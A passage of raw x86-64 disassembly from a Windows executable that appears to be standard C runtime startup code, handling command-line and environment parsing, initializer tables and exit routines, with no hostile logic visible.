   140003bf2:	73 3d                	jae    0x140003c31
   140003bf4:	33 d2                	xor    %edx,%edx
   140003bf6:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140003bfa:	49 f7 f0             	div    %r8
   140003bfd:	4c 3b c8             	cmp    %rax,%r9
   140003c00:	73 2f                	jae    0x140003c31
   140003c02:	48 c1 e1 03          	shl    $0x3,%rcx
   140003c06:	4d 0f af c8          	imul   %r8,%r9
   140003c0a:	48 8b c1             	mov    %rcx,%rax
   140003c0d:	48 f7 d0             	not    %rax
   140003c10:	49 3b c1             	cmp    %r9,%rax
   140003c13:	76 1c                	jbe    0x140003c31
   140003c15:	49 03 c9             	add    %r9,%rcx
   140003c18:	ba 01 00 00 00       	mov    $0x1,%edx
   140003c1d:	e8 be 1b 00 00       	call   0x1400057e0
   140003c22:	33 c9                	xor    %ecx,%ecx
   140003c24:	48 8b d8             	mov    %rax,%rbx
   140003c27:	e8 2c 1c 00 00       	call   0x140005858
   140003c2c:	48 8b c3             	mov    %rbx,%rax
   140003c2f:	eb 02                	jmp    0x140003c33
   140003c31:	33 c0                	xor    %eax,%eax
   140003c33:	48 83 c4 20          	add    $0x20,%rsp
   140003c37:	5b                   	pop    %rbx
   140003c38:	c3                   	ret
   140003c39:	cc                   	int3
   140003c3a:	cc                   	int3
   140003c3b:	cc                   	int3
   140003c3c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003c41:	55                   	push   %rbp
   140003c42:	56                   	push   %rsi
   140003c43:	57                   	push   %rdi
   140003c44:	41 56                	push   %r14
   140003c46:	41 57                	push   %r15
   140003c48:	48 8b ec             	mov    %rsp,%rbp
   140003c4b:	48 83 ec 30          	sub    $0x30,%rsp
   140003c4f:	33 ff                	xor    %edi,%edi
   140003c51:	44 8b f1             	mov    %ecx,%r14d
   140003c54:	85 c9                	test   %ecx,%ecx
   140003c56:	0f 84 53 01 00 00    	je     0x140003daf
   140003c5c:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140003c5f:	83 f8 01             	cmp    $0x1,%eax
   140003c62:	76 16                	jbe    0x140003c7a
   140003c64:	e8 57 1b 00 00       	call   0x1400057c0
   140003c69:	8d 5f 16             	lea    0x16(%rdi),%ebx
   140003c6c:	89 18                	mov    %ebx,(%rax)
   140003c6e:	e8 2d 1a 00 00       	call   0x1400056a0
   140003c73:	8b fb                	mov    %ebx,%edi
   140003c75:	e9 35 01 00 00       	jmp    0x140003daf
   140003c7a:	e8 39 2f 00 00       	call   0x140006bb8
   140003c7f:	48 8d 1d aa 3f 01 00 	lea    0x13faa(%rip),%rbx        # 0x140017c30
   140003c86:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140003c8c:	48 8b d3             	mov    %rbx,%rdx
   140003c8f:	33 c9                	xor    %ecx,%ecx
   140003c91:	e8 da 26 00 00       	call   0x140006370
   140003c96:	48 8b 35 f3 40 01 00 	mov    0x140f3(%rip),%rsi        # 0x140017d90
   140003c9d:	48 89 1d cc 40 01 00 	mov    %rbx,0x140cc(%rip)        # 0x140017d70
   140003ca4:	48 85 f6             	test   %rsi,%rsi
   140003ca7:	74 05                	je     0x140003cae
   140003ca9:	40 38 3e             	cmp    %dil,(%rsi)
   140003cac:	75 03                	jne    0x140003cb1
   140003cae:	48 8b f3             	mov    %rbx,%rsi
   140003cb1:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140003cb5:	48 89 7d 40          	mov    %rdi,0x40(%rbp)
   140003cb9:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   140003cbd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003cc2:	45 33 c0             	xor    %r8d,%r8d
   140003cc5:	48 89 7d 48          	mov    %rdi,0x48(%rbp)
   140003cc9:	33 d2                	xor    %edx,%edx
   140003ccb:	48 8b ce             	mov    %rsi,%rcx
   140003cce:	e8 49 fd ff ff       	call   0x140003a1c
   140003cd3:	4c 8b 7d 40          	mov    0x40(%rbp),%r15
   140003cd7:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003cdd:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   140003ce1:	49 8b cf             	mov    %r15,%rcx
   140003ce4:	e8 f3 fe ff ff       	call   0x140003bdc
   140003ce9:	48 8b d8             	mov    %rax,%rbx
   140003cec:	48 85 c0             	test   %rax,%rax
   140003cef:	75 18                	jne    0x140003d09
   140003cf1:	e8 ca 1a 00 00       	call   0x1400057c0
   140003cf6:	bb 0c 00 00 00       	mov    $0xc,%ebx
   140003cfb:	33 c9                	xor    %ecx,%ecx
   140003cfd:	89 18                	mov    %ebx,(%rax)
   140003cff:	e8 54 1b 00 00       	call   0x140005858
   140003d04:	e9 6a ff ff ff       	jmp    0x140003c73
   140003d09:	4e 8d 04 f8          	lea    (%rax,%r15,8),%r8
   140003d0d:	48 8b d3             	mov    %rbx,%rdx
   140003d10:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140003d14:	48 8b ce             	mov    %rsi,%rcx
   140003d17:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   140003d1b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003d20:	e8 f7 fc ff ff       	call   0x140003a1c
   140003d25:	41 83 fe 01          	cmp    $0x1,%r14d
   140003d29:	75 16                	jne    0x140003d41
   140003d2b:	8b 45 40             	mov    0x40(%rbp),%eax
   140003d2e:	ff c8                	dec    %eax
   140003d30:	48 89 1d 49 40 01 00 	mov    %rbx,0x14049(%rip)        # 0x140017d80
   140003d37:	89 05 3b 40 01 00    	mov    %eax,0x1403b(%rip)        # 0x140017d78
   140003d3d:	33 c9                	xor    %ecx,%ecx
   140003d3f:	eb 69                	jmp    0x140003daa
   140003d41:	48 8d 55 38          	lea    0x38(%rbp),%rdx
   140003d45:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140003d49:	48 8b cb             	mov    %rbx,%rcx
   140003d4c:	e8 03 25 00 00       	call   0x140006254
   140003d51:	8b f0                	mov    %eax,%esi
   140003d53:	85 c0                	test   %eax,%eax
   140003d55:	74 19                	je     0x140003d70
   140003d57:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   140003d5b:	e8 f8 1a 00 00       	call   0x140005858
   140003d60:	48 8b cb             	mov    %rbx,%rcx
   140003d63:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140003d67:	e8 ec 1a 00 00       	call   0x140005858
   140003d6c:	8b fe                	mov    %esi,%edi
   140003d6e:	eb 3f                	jmp    0x140003daf
   140003d70:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   140003d74:	48 8b cf             	mov    %rdi,%rcx
   140003d77:	48 8b c2             	mov    %rdx,%rax
   140003d7a:	48 39 3a             	cmp    %rdi,(%rdx)
   140003d7d:	74 0c                	je     0x140003d8b
   140003d7f:	48 8d 40 08          	lea    0x8(%rax),%rax
   140003d83:	48 ff c1             	inc    %rcx
   140003d86:	48 39 38             	cmp    %rdi,(%rax)
   140003d89:	75 f4                	jne    0x140003d7f
   140003d8b:	89 0d e7 3f 01 00    	mov    %ecx,0x13fe7(%rip)        # 0x140017d78
   140003d91:	33 c9                	xor    %ecx,%ecx
   140003d93:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140003d97:	48 89 15 e2 3f 01 00 	mov    %rdx,0x13fe2(%rip)        # 0x140017d80
   140003d9e:	e8 b5 1a 00 00       	call   0x140005858
   140003da3:	48 8b cb             	mov    %rbx,%rcx
   140003da6:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140003daa:	e8 a9 1a 00 00       	call   0x140005858
   140003daf:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140003db4:	8b c7                	mov    %edi,%eax
   140003db6:	48 83 c4 30          	add    $0x30,%rsp
   140003dba:	41 5f                	pop    %r15
   140003dbc:	41 5e                	pop    %r14
   140003dbe:	5f                   	pop    %rdi
   140003dbf:	5e                   	pop    %rsi
   140003dc0:	5d                   	pop    %rbp
   140003dc1:	c3                   	ret
   140003dc2:	cc                   	int3
   140003dc3:	cc                   	int3
   140003dc4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003dc9:	57                   	push   %rdi
   140003dca:	48 83 ec 20          	sub    $0x20,%rsp
   140003dce:	33 ff                	xor    %edi,%edi
   140003dd0:	48 39 3d 61 3f 01 00 	cmp    %rdi,0x13f61(%rip)        # 0x140017d38
   140003dd7:	74 04                	je     0x140003ddd
   140003dd9:	33 c0                	xor    %eax,%eax
   140003ddb:	eb 48                	jmp    0x140003e25
   140003ddd:	e8 d6 2d 00 00       	call   0x140006bb8
   140003de2:	e8 a1 32 00 00       	call   0x140007088
   140003de7:	48 8b d8             	mov    %rax,%rbx
   140003dea:	48 85 c0             	test   %rax,%rax
   140003ded:	75 05                	jne    0x140003df4
   140003def:	83 cf ff             	or     $0xffffffff,%edi
   140003df2:	eb 27                	jmp    0x140003e1b
   140003df4:	48 8b cb             	mov    %rbx,%rcx
   140003df7:	e8 34 00 00 00       	call   0x140003e30
   140003dfc:	48 85 c0             	test   %rax,%rax
   140003dff:	75 05                	jne    0x140003e06
   140003e01:	83 cf ff             	or     $0xffffffff,%edi
   140003e04:	eb 0e                	jmp    0x140003e14
   140003e06:	48 89 05 43 3f 01 00 	mov    %rax,0x13f43(%rip)        # 0x140017d50
   140003e0d:	48 89 05 24 3f 01 00 	mov    %rax,0x13f24(%rip)        # 0x140017d38
   140003e14:	33 c9                	xor    %ecx,%ecx
   140003e16:	e8 3d 1a 00 00       	call   0x140005858
   140003e1b:	48 8b cb             	mov    %rbx,%rcx
   140003e1e:	e8 35 1a 00 00       	call   0x140005858
   140003e23:	8b c7                	mov    %edi,%eax
   140003e25:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003e2a:	48 83 c4 20          	add    $0x20,%rsp
   140003e2e:	5f                   	pop    %rdi
   140003e2f:	c3                   	ret
   140003e30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003e35:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003e3a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003e3f:	57                   	push   %rdi
   140003e40:	41 56                	push   %r14
   140003e42:	41 57                	push   %r15
   140003e44:	48 83 ec 30          	sub    $0x30,%rsp
   140003e48:	4c 8b f1             	mov    %rcx,%r14
   140003e4b:	33 f6                	xor    %esi,%esi
   140003e4d:	8b ce                	mov    %esi,%ecx
   140003e4f:	4d 8b c6             	mov    %r14,%r8
   140003e52:	41 8a 16             	mov    (%r14),%dl
   140003e55:	eb 24                	jmp    0x140003e7b
   140003e57:	80 fa 3d             	cmp    $0x3d,%dl
   140003e5a:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140003e5e:	48 0f 44 c1          	cmove  %rcx,%rax
   140003e62:	48 8b c8             	mov    %rax,%rcx
   140003e65:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140003e69:	48 ff c0             	inc    %rax
   140003e6c:	41 38 34 00          	cmp    %sil,(%r8,%rax,1)
   140003e70:	75 f7                	jne    0x140003e69
   140003e72:	49 ff c0             	inc    %r8
   140003e75:	4c 03 c0             	add    %rax,%r8
   140003e78:	41 8a 10             	mov    (%r8),%dl
   140003e7b:	84 d2                	test   %dl,%dl
   140003e7d:	75 d8                	jne    0x140003e57
   140003e7f:	48 ff c1             	inc    %rcx
   140003e82:	ba 08 00 00 00       	mov    $0x8,%edx
   140003e87:	e8 54 19 00 00       	call   0x1400057e0
   140003e8c:	48 8b d8             	mov    %rax,%rbx
   140003e8f:	48 85 c0             	test   %rax,%rax
   140003e92:	74 6c                	je     0x140003f00
   140003e94:	4c 8b f8             	mov    %rax,%r15
   140003e97:	41 8a 06             	mov    (%r14),%al
   140003e9a:	84 c0                	test   %al,%al
   140003e9c:	74 5f                	je     0x140003efd
   140003e9e:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140003ea2:	48 ff c5             	inc    %rbp
   140003ea5:	41 38 34 2e          	cmp    %sil,(%r14,%rbp,1)
   140003ea9:	75 f7                	jne    0x140003ea2
   140003eab:	48 ff c5             	inc    %rbp
   140003eae:	3c 3d                	cmp    $0x3d,%al
   140003eb0:	74 35                	je     0x140003ee7
   140003eb2:	ba 01 00 00 00       	mov    $0x1,%edx
   140003eb7:	48 8b cd             	mov    %rbp,%rcx
   140003eba:	e8 21 19 00 00       	call   0x1400057e0
   140003ebf:	48 8b f8             	mov    %rax,%rdi
   140003ec2:	48 85 c0             	test   %rax,%rax
   140003ec5:	74 25                	je     0x140003eec
   140003ec7:	4d 8b c6             	mov    %r14,%r8
   140003eca:	48 8b d5             	mov    %rbp,%rdx
   140003ecd:	48 8b c8             	mov    %rax,%rcx
   140003ed0:	e8 d7 0d 00 00       	call   0x140004cac
   140003ed5:	33 c9                	xor    %ecx,%ecx
   140003ed7:	85 c0                	test   %eax,%eax
   140003ed9:	75 48                	jne    0x140003f23
   140003edb:	49 89 3f             	mov    %rdi,(%r15)
   140003ede:	49 83 c7 08          	add    $0x8,%r15
   140003ee2:	e8 71 19 00 00       	call   0x140005858
   140003ee7:	4c 03 f5             	add    %rbp,%r14
   140003eea:	eb ab                	jmp    0x140003e97
   140003eec:	48 8b cb             	mov    %rbx,%rcx
   140003eef:	e8 44 00 00 00       	call   0x140003f38
   140003ef4:	33 c9                	xor    %ecx,%ecx
   140003ef6:	e8 5d 19 00 00       	call   0x140005858
   140003efb:	eb 03                	jmp    0x140003f00
   140003efd:	48 8b f3             	mov    %rbx,%rsi
   140003f00:	33 c9                	xor    %ecx,%ecx
   140003f02:	e8 51 19 00 00       	call   0x140005858
   140003f07:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140003f0c:	48 8b c6             	mov    %rsi,%rax
   140003f0f:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140003f14:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140003f19:	48 83 c4 30          	add    $0x30,%rsp
   140003f1d:	41 5f                	pop    %r15
   140003f1f:	41 5e                	pop    %r14
   140003f21:	5f                   	pop    %rdi
   140003f22:	c3                   	ret
   140003f23:	45 33 c9             	xor    %r9d,%r9d
   140003f26:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003f2b:	45 33 c0             	xor    %r8d,%r8d
   140003f2e:	33 d2                	xor    %edx,%edx
   140003f30:	e8 8b 17 00 00       	call   0x1400056c0
   140003f35:	cc                   	int3
   140003f36:	cc                   	int3
   140003f37:	cc                   	int3
   140003f38:	48 85 c9             	test   %rcx,%rcx
   140003f3b:	74 3b                	je     0x140003f78
   140003f3d:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003f42:	57                   	push   %rdi
   140003f43:	48 83 ec 20          	sub    $0x20,%rsp
   140003f47:	48 8b 01             	mov    (%rcx),%rax
   140003f4a:	48 8b d9             	mov    %rcx,%rbx
   140003f4d:	48 8b f9             	mov    %rcx,%rdi
   140003f50:	eb 0f                	jmp    0x140003f61
   140003f52:	48 8b c8             	mov    %rax,%rcx
   140003f55:	e8 fe 18 00 00       	call   0x140005858
   140003f5a:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   140003f5e:	48 8b 07             	mov    (%rdi),%rax
   140003f61:	48 85 c0             	test   %rax,%rax
   140003f64:	75 ec                	jne    0x140003f52
   140003f66:	48 8b cb             	mov    %rbx,%rcx
   140003f69:	e8 ea 18 00 00       	call   0x140005858
   140003f6e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003f73:	48 83 c4 20          	add    $0x20,%rsp
   140003f77:	5f                   	pop    %rdi
   140003f78:	c3                   	ret
   140003f79:	cc                   	int3
   140003f7a:	cc                   	int3
   140003f7b:	cc                   	int3
   140003f7c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003f81:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003f86:	57                   	push   %rdi
   140003f87:	48 83 ec 40          	sub    $0x40,%rsp
   140003f8b:	48 8b 3d ae 3d 01 00 	mov    0x13dae(%rip),%rdi        # 0x140017d40
   140003f92:	48 85 ff             	test   %rdi,%rdi
   140003f95:	0f 85 94 00 00 00    	jne    0x14000402f
   140003f9b:	83 c8 ff             	or     $0xffffffff,%eax
   140003f9e:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140003fa3:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140003fa8:	48 83 c4 40          	add    $0x40,%rsp
   140003fac:	5f                   	pop    %rdi
   140003fad:	c3                   	ret
   140003fae:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140003fb4:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140003fb8:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140003fbe:	4c 8b c0             	mov    %rax,%r8
   140003fc1:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140003fc6:	33 d2                	xor    %edx,%edx
   140003fc8:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140003fce:	33 c9                	xor    %ecx,%ecx
   140003fd0:	e8 03 30 00 00       	call   0x140006fd8
   140003fd5:	48 63 f0             	movslq %eax,%rsi
   140003fd8:	85 c0                	test   %eax,%eax
   140003fda:	74 bf                	je     0x140003f9b
   140003fdc:	ba 01 00 00 00       	mov    $0x1,%edx
   140003fe1:	48 8b ce             	mov    %rsi,%rcx
   140003fe4:	e8 f7 17 00 00       	call   0x1400057e0
   140003fe9:	48 8b d8             	mov    %rax,%rbx
   140003fec:	48 85 c0             	test   %rax,%rax
   140003fef:	74 4f                	je     0x140004040
   140003ff1:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140003ff7:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140003ffb:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140004001:	33 d2                	xor    %edx,%edx
   140004003:	4c 8b 07             	mov    (%rdi),%r8
   140004006:	33 c9                	xor    %ecx,%ecx
   140004008:	89 74 24 28          	mov    %esi,0x28(%rsp)
   14000400c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004011:	e8 c2 2f 00 00       	call   0x140006fd8
   140004016:	85 c0                	test   %eax,%eax
   140004018:	74 26                	je     0x140004040
   14000401a:	33 d2                	xor    %edx,%edx
   14000401c:	48 8b cb             	mov    %rbx,%rcx
   14000401f:	e8 70 35 00 00       	call   0x140007594
   140004024:	33 c9                	xor    %ecx,%ecx
   140004026:	e8 2d 18 00 00       	call   0x140005858
   14000402b:	48 83 c7 08          	add    $0x8,%rdi
   14000402f:	48 8b 07             	mov    (%rdi),%rax
   140004032:	48 85 c0             	test   %rax,%rax
   140004035:	0f 85 73 ff ff ff    	jne    0x140003fae
   14000403b:	e9 5e ff ff ff       	jmp    0x140003f9e
   140004040:	48 8b cb             	mov    %rbx,%rcx
   140004043:	e8 10 18 00 00       	call   0x140005858
   140004048:	e9 4e ff ff ff       	jmp    0x140003f9b
   14000404d:	cc                   	int3
   14000404e:	cc                   	int3
   14000404f:	cc                   	int3
   140004050:	48 83 ec 28          	sub    $0x28,%rsp
   140004054:	48 8b 09             	mov    (%rcx),%rcx
   140004057:	48 3b 0d f2 3c 01 00 	cmp    0x13cf2(%rip),%rcx        # 0x140017d50
   14000405e:	74 05                	je     0x140004065
   140004060:	e8 d3 fe ff ff       	call   0x140003f38
   140004065:	48 83 c4 28          	add    $0x28,%rsp
   140004069:	c3                   	ret
   14000406a:	cc                   	int3
   14000406b:	cc                   	int3
   14000406c:	48 83 ec 28          	sub    $0x28,%rsp
   140004070:	48 8b 09             	mov    (%rcx),%rcx
   140004073:	48 3b 0d ce 3c 01 00 	cmp    0x13cce(%rip),%rcx        # 0x140017d48
   14000407a:	74 05                	je     0x140004081
   14000407c:	e8 b7 fe ff ff       	call   0x140003f38
   140004081:	48 83 c4 28          	add    $0x28,%rsp
   140004085:	c3                   	ret
   140004086:	cc                   	int3
   140004087:	cc                   	int3
   140004088:	48 83 ec 28          	sub    $0x28,%rsp
   14000408c:	48 8b 05 a5 3c 01 00 	mov    0x13ca5(%rip),%rax        # 0x140017d38
   140004093:	48 85 c0             	test   %rax,%rax
   140004096:	75 26                	jne    0x1400040be
   140004098:	48 39 05 a1 3c 01 00 	cmp    %rax,0x13ca1(%rip)        # 0x140017d40
   14000409f:	75 04                	jne    0x1400040a5
   1400040a1:	33 c0                	xor    %eax,%eax
   1400040a3:	eb 19                	jmp    0x1400040be
   1400040a5:	e8 1a fd ff ff       	call   0x140003dc4
   1400040aa:	85 c0                	test   %eax,%eax
   1400040ac:	74 09                	je     0x1400040b7
   1400040ae:	e8 c9 fe ff ff       	call   0x140003f7c
   1400040b3:	85 c0                	test   %eax,%eax
   1400040b5:	75 ea                	jne    0x1400040a1
   1400040b7:	48 8b 05 7a 3c 01 00 	mov    0x13c7a(%rip),%rax        # 0x140017d38
   1400040be:	48 83 c4 28          	add    $0x28,%rsp
   1400040c2:	c3                   	ret
   1400040c3:	cc                   	int3
   1400040c4:	48 83 ec 28          	sub    $0x28,%rsp
   1400040c8:	48 8d 0d 69 3c 01 00 	lea    0x13c69(%rip),%rcx        # 0x140017d38
   1400040cf:	e8 7c ff ff ff       	call   0x140004050
   1400040d4:	48 8d 0d 65 3c 01 00 	lea    0x13c65(%rip),%rcx        # 0x140017d40
   1400040db:	e8 8c ff ff ff       	call   0x14000406c
   1400040e0:	48 8b 0d 69 3c 01 00 	mov    0x13c69(%rip),%rcx        # 0x140017d50
   1400040e7:	e8 4c fe ff ff       	call   0x140003f38
   1400040ec:	48 8b 0d 55 3c 01 00 	mov    0x13c55(%rip),%rcx        # 0x140017d48
   1400040f3:	48 83 c4 28          	add    $0x28,%rsp
   1400040f7:	e9 3c fe ff ff       	jmp    0x140003f38
   1400040fc:	48 83 ec 28          	sub    $0x28,%rsp
   140004100:	48 8b 05 49 3c 01 00 	mov    0x13c49(%rip),%rax        # 0x140017d50
   140004107:	48 85 c0             	test   %rax,%rax
   14000410a:	75 39                	jne    0x140004145
   14000410c:	48 8b 05 25 3c 01 00 	mov    0x13c25(%rip),%rax        # 0x140017d38
   140004113:	48 85 c0             	test   %rax,%rax
   140004116:	75 26                	jne    0x14000413e
   140004118:	48 39 05 21 3c 01 00 	cmp    %rax,0x13c21(%rip)        # 0x140017d40
   14000411f:	75 04                	jne    0x140004125
   140004121:	33 c0                	xor    %eax,%eax
   140004123:	eb 19                	jmp    0x14000413e
   140004125:	e8 9a fc ff ff       	call   0x140003dc4
   14000412a:	85 c0                	test   %eax,%eax
   14000412c:	74 09                	je     0x140004137
   14000412e:	e8 49 fe ff ff       	call   0x140003f7c
   140004133:	85 c0                	test   %eax,%eax
   140004135:	75 ea                	jne    0x140004121
   140004137:	48 8b 05 fa 3b 01 00 	mov    0x13bfa(%rip),%rax        # 0x140017d38
   14000413e:	48 89 05 0b 3c 01 00 	mov    %rax,0x13c0b(%rip)        # 0x140017d50
   140004145:	48 83 c4 28          	add    $0x28,%rsp
   140004149:	c3                   	ret
   14000414a:	cc                   	int3
   14000414b:	cc                   	int3
   14000414c:	e9 73 fc ff ff       	jmp    0x140003dc4
   140004151:	cc                   	int3
   140004152:	cc                   	int3
   140004153:	cc                   	int3
   140004154:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004159:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000415e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004163:	57                   	push   %rdi
   140004164:	48 83 ec 20          	sub    $0x20,%rsp
   140004168:	33 ed                	xor    %ebp,%ebp
   14000416a:	48 8b fa             	mov    %rdx,%rdi
   14000416d:	48 2b f9             	sub    %rcx,%rdi
   140004170:	48 8b d9             	mov    %rcx,%rbx
   140004173:	48 83 c7 07          	add    $0x7,%rdi
   140004177:	8b f5                	mov    %ebp,%esi
   140004179:	48 c1 ef 03          	shr    $0x3,%rdi
   14000417d:	48 3b ca             	cmp    %rdx,%rcx
   140004180:	48 0f 47 fd          	cmova  %rbp,%rdi
   140004184:	48 85 ff             	test   %rdi,%rdi
   140004187:	74 1a                	je     0x1400041a3
   140004189:	48 8b 03             	mov    (%rbx),%rax
   14000418c:	48 85 c0             	test   %rax,%rax
   14000418f:	74 06                	je     0x140004197
   140004191:	ff 15 a1 a0 00 00    	call   *0xa0a1(%rip)        # 0x14000e238
   140004197:	48 83 c3 08          	add    $0x8,%rbx
   14000419b:	48 ff c6             	inc    %rsi
   14000419e:	48 3b f7             	cmp    %rdi,%rsi
   1400041a1:	75 e6                	jne    0x140004189
   1400041a3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400041a8:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400041ad:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400041b2:	48 83 c4 20          	add    $0x20,%rsp
   1400041b6:	5f                   	pop    %rdi
   1400041b7:	c3                   	ret
   1400041b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400041bd:	57                   	push   %rdi
   1400041be:	48 83 ec 20          	sub    $0x20,%rsp
   1400041c2:	48 8b fa             	mov    %rdx,%rdi
   1400041c5:	48 8b d9             	mov    %rcx,%rbx
   1400041c8:	48 3b ca             	cmp    %rdx,%rcx
   1400041cb:	74 1b                	je     0x1400041e8
   1400041cd:	48 8b 03             	mov    (%rbx),%rax
   1400041d0:	48 85 c0             	test   %rax,%rax
   1400041d3:	74 0a                	je     0x1400041df
   1400041d5:	ff 15 5d a0 00 00    	call   *0xa05d(%rip)        # 0x14000e238
   1400041db:	85 c0                	test   %eax,%eax
   1400041dd:	75 0b                	jne    0x1400041ea
   1400041df:	48 83 c3 08          	add    $0x8,%rbx
   1400041e3:	48 3b df             	cmp    %rdi,%rbx
   1400041e6:	eb e3                	jmp    0x1400041cb
   1400041e8:	33 c0                	xor    %eax,%eax
   1400041ea:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400041ef:	48 83 c4 20          	add    $0x20,%rsp
   1400041f3:	5f                   	pop    %rdi
   1400041f4:	c3                   	ret
   1400041f5:	cc                   	int3
   1400041f6:	cc                   	int3
   1400041f7:	cc                   	int3
   1400041f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400041fd:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004202:	57                   	push   %rdi
   140004203:	48 83 ec 20          	sub    $0x20,%rsp
   140004207:	49 8b d9             	mov    %r9,%rbx
   14000420a:	49 8b f8             	mov    %r8,%rdi
   14000420d:	8b 0a                	mov    (%rdx),%ecx
   14000420f:	e8 d0 33 00 00       	call   0x1400075e4
   140004214:	90                   	nop
   140004215:	48 8b cf             	mov    %rdi,%rcx
   140004218:	e8 13 00 00 00       	call   0x140004230
   14000421d:	90                   	nop
   14000421e:	8b 0b                	mov    (%rbx),%ecx
   140004220:	e8 13 34 00 00       	call   0x140007638
   140004225:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000422a:	48 83 c4 20          	add    $0x20,%rsp
   14000422e:	5f                   	pop    %rdi
   14000422f:	c3                   	ret
   140004230:	40 53                	rex push %rbx
   140004232:	48 83 ec 20          	sub    $0x20,%rsp
   140004236:	48 8b d9             	mov    %rcx,%rbx
   140004239:	80 3d 28 3b 01 00 00 	cmpb   $0x0,0x13b28(%rip)        # 0x140017d68
   140004240:	0f 85 9f 00 00 00    	jne    0x1400042e5
   140004246:	b8 01 00 00 00       	mov    $0x1,%eax
   14000424b:	87 05 07 3b 01 00    	xchg   %eax,0x13b07(%rip)        # 0x140017d58
   140004251:	48 8b 01             	mov    (%rcx),%rax
   140004254:	8b 08                	mov    (%rax),%ecx
   140004256:	85 c9                	test   %ecx,%ecx
   140004258:	75 34                	jne    0x14000428e
   14000425a:	48 8b 05 c7 2d 01 00 	mov    0x12dc7(%rip),%rax        # 0x140017028
   140004261:	8b c8                	mov    %eax,%ecx
   140004263:	83 e1 3f             	and    $0x3f,%ecx
   140004266:	48 8b 15 f3 3a 01 00 	mov    0x13af3(%rip),%rdx        # 0x140017d60
   14000426d:	48 3b d0             	cmp    %rax,%rdx
   140004270:	74 13                	je     0x140004285
   140004272:	48 33 c2             	xor    %rdx,%rax
   140004275:	48 d3 c8             	ror    %cl,%rax
   140004278:	45 33 c0             	xor    %r8d,%r8d
   14000427b:	33 d2                	xor    %edx,%edx
   14000427d:	33 c9                	xor    %ecx,%ecx
   14000427f:	ff 15 b3 9f 00 00    	call   *0x9fb3(%rip)        # 0x14000e238
   140004285:	48 8d 0d 24 3b 01 00 	lea    0x13b24(%rip),%rcx        # 0x140017db0
   14000428c:	eb 0c                	jmp    0x14000429a
   14000428e:	83 f9 01             	cmp    $0x1,%ecx
   140004291:	75 0d                	jne    0x1400042a0
   140004293:	48 8d 0d 2e 3b 01 00 	lea    0x13b2e(%rip),%rcx        # 0x140017dc8
   14000429a:	e8 5d 07 00 00       	call   0x1400049fc
   14000429f:	90                   	nop
   1400042a0:	48 8b 03             	mov    (%rbx),%rax
   1400042a3:	83 38 00             	cmpl   $0x0,(%rax)
   1400042a6:	75 13                	jne    0x1400042bb
   1400042a8:	48 8d 15 19 a0 00 00 	lea    0xa019(%rip),%rdx        # 0x14000e2c8
   1400042af:	48 8d 0d f2 9f 00 00 	lea    0x9ff2(%rip),%rcx        # 0x14000e2a8
   1400042b6:	e8 99 fe ff ff       	call   0x140004154
   1400042bb:	48 8d 15 16 a0 00 00 	lea    0xa016(%rip),%rdx        # 0x14000e2d8
   1400042c2:	48 8d 0d 07 a0 00 00 	lea    0xa007(%rip),%rcx        # 0x14000e2d0
   1400042c9:	e8 86 fe ff ff       	call   0x140004154
   1400042ce:	48 8b 43 08          	mov    0x8(%rbx),%rax
